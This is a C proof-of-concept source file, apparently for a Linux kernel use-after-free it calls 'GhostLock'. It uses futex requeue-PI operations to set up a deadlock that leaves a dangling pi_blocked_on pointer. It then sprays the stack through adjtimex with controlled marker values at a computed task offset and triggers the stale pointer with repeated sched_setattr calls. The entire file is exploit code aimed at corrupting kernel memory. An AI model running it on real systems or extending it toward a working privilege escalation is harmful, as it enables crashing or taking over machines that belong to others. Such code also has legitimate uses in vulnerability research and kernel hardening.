/**
 * ghostlock_uaf_reclaim_consumer.c — EDEADLK priming + adjtimex reclaim + consumer
 *
 * After true GhostLock dangling pi_blocked_on:
 *   1) Waiter returns from WAIT_REQUEUE_PI
 *   2) Same thread adjtimex 208B paints stack covering task@stack_top-0x168
 *   3) Consumer sched_setattr(waiter_tid) walks pi_blocked_on → fake residual
 *
 * Crash / non-zero consumer side-effect ⇒ UAF live (outcome 4A candidate).
 * Survive with WAIT never returning ⇒ EDEADLK not hit.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/timex.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif

/* CORRECTED: task @ stack_top-0x168; adjtimex CFU ~[ -0x118, -0x1e8 ) */
#define ADJTIMEX_TASK_SLOT 0x50

static uint32_t f_wait __attribute__((aligned(64)));
static uint32_t f_pi_target __attribute__((aligned(64)));
static uint32_t f_pi_chain __attribute__((aligned(64)));

static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_started;
static atomic_int owner_on_chain;
static atomic_int wait_returned;
static atomic_int cfu_done;
static atomic_int all_done;
static atomic_int waiter_tid;
static atomic_int requeue_ret_a;
static atomic_int wait_errno_a;

static long futex_op(uint32_t *uaddr, int op, uint32_t val, const void *timeout,
                     uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static long sched_setattr_tid(int tid, int nice) {
  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint32_t sched_period;
    uint32_t sched_util_min;
    uint32_t sched_util_max;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = nice;
  return syscall(274, tid, &attr, 0);
}

static void *waiter_thread(void *arg) {
  (void)arg;
  atomic_store(&waiter_tid, (int)syscall(SYS_gettid));

  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started))
    usleep(500);

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 3;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  atomic_store(&wait_errno_a, errno);
  atomic_store(&wait_returned, 1);
  printf("[W] WAIT ret=%ld errno=%d\n", r, errno);
  fflush(stdout);

  /* T3 reclaim: 208B adjtimex — poison task slot */
  unsigned char buf[256];
  memset(buf, 0x41, sizeof(buf));
  *(uint64_t *)(buf + ADJTIMEX_TASK_SLOT) = 0x4141414141414141ULL;
  *(uint64_t *)(buf + ADJTIMEX_TASK_SLOT - 8) = 0x4242424242424242ULL;
  *(uint64_t *)(buf + ADJTIMEX_TASK_SLOT + 8) = 0x4343434343434343ULL;
  errno = 0;
  r = syscall(SYS_adjtimex, buf);
  printf("[W] adjtimex reclaim ret=%ld errno=%d sizeof_timex_hint=%zu\n", r, errno,
         sizeof(struct timex));
  fflush(stdout);
  atomic_store(&cfu_done, 1);

  /* Brief window for consumer before unlock chain */
  usleep(200000);

  printf("[W] unlocking chain\n");
  fflush(stdout);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&all_done, 1);
  printf("[W] done\n");
  fflush(stdout);
  return NULL;
}

static void *owner_thread(void *arg) {
  (void)arg;
  futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&waiter_ready))
    usleep(500);
  atomic_store(&owner_started, 1);
  atomic_store(&owner_on_chain, 1);
  printf("[O] LOCK_PI f_pi_chain (deadlock edge)\n");
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  printf("[O] got chain\n");
  while (!atomic_load(&all_done))
    usleep(10000);
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

static void *consumer_thread(void *arg) {
  (void)arg;
  /* Wait until reclaim done (or timeout) */
  for (int i = 0; i < 1000 && !atomic_load(&cfu_done); i++)
    usleep(10000);
  int tid = atomic_load(&waiter_tid);
  printf("[C] consumer start tid=%d cfu_done=%d wait_returned=%d\n", tid,
         atomic_load(&cfu_done), atomic_load(&wait_returned));
  for (int i = 0; i < 50; i++) {
    if (tid <= 0)
      break;
    errno = 0;
    long r = sched_setattr_tid(tid, 1 + (i % 15));
    if (i < 3 || r != 0)
      printf("[C] sched_setattr i=%d ret=%ld errno=%d\n", i, r, errno);
    usleep(1000);
  }
  return NULL;
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  printf("ghostlock_uaf_reclaim_consumer — EDEADLK + adjtimex + consumer\n");
  printf("CRASH after adjtimex/sched_setattr => dangling pi_blocked_on live\n\n");

  f_wait = f_pi_target = f_pi_chain = 0;
  pthread_t wt, ot, ct;
  pthread_create(&wt, NULL, waiter_thread, NULL);
  pthread_create(&ot, NULL, owner_thread, NULL);
  pthread_create(&ct, NULL, consumer_thread, NULL);

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_on_chain))
    usleep(1000);
  usleep(80000);

  errno = 0;
  long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)(uintptr_t)1,
                     &f_pi_target, f_wait);
  atomic_store(&requeue_ret_a, (int)rr);
  printf("[M] CMP_REQUEUE_PI ret=%ld errno=%d\n", rr, errno);

  for (int i = 0; i < 900 && !atomic_load(&all_done); i++)
    usleep(10000);

  if (!atomic_load(&wait_returned))
    printf("[M] TIMEOUT: WAIT never returned (no EDEADLK wake?)\n");

  pthread_join(wt, NULL);
  pthread_join(ct, NULL);
  pthread_join(ot, NULL);

  printf("\n=== SURVIVED requeue_ret=%d wait_errno=%d cfu=%d ===\n",
         atomic_load(&requeue_ret_a), atomic_load(&wait_errno_a),
         atomic_load(&cfu_done));
  return 0;
}
